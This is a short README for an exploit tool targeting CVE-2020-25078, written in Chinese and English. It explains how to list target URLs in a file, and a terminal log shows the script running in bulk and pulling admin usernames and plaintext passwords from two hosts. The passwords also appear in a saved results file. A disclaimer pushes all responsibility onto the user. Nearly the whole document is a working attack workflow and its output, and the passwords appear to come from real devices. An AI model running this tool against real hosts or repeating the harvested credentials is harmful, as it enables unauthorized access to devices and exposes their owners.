# CVE-2020-25078

# 使用说明
# instructions
攻击url放同一目录下 ip.txt

The attack IP is placed in the same directory as ip.txt

# Terminal log
root@localhost:~/CVE-2020-25078#ls

CVE-2020-25078.py
ip.txt


root@localhost:~/CVE-2020-25078#cat ./ip.txt

https://xxx.xxx.xxx.xxx:3128

http://xxx.xxx.xxx.xxx:80

https://xxx.xxx.xxx.xxx:8080

https://xxx.xxx.xxx.xxx:443


root@localhost:~/CVE-2020-25078#python3 ./CVE-2020-25078.py

Start Running Exploit...

[+Login URL]==> http://xxx.xxx.xxx.xxx:80
UserName: ['admin']      PassWord: ['Sruthimina123']


[+Login URL]==> http://xxx.xxx.xxx.xxx:443
UserName: ['admin']      PassWord: ['ming502219']


root@localhost:~/CVE-2020-25078# ls -l

CVE-2020-25078.py

exploit_ok.txt

ip.txt

README.md


root@localhost:~/CVE-2020-25078# cat ./exploit_ok.txt


[+Login URL]==>http://xxx.xxx.xxx.xxx:80
[+UserName]==>['admin'] [+PassWord]==>['Sruthimina123']

[+Login URL]==>http://xxx.xxx.xxx.xxx:443
[+UserName]==>['admin'] [+PassWord]==>['ming502219']

root@localhost:~/CVE-2020-25078#


# 免责声明
# Disclaimers

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。
Any direct or indirect consequences and losses caused by the dissemination and use of the information provided in this article shall be borne by the user himself, and the author shall not bear any responsibility for this.
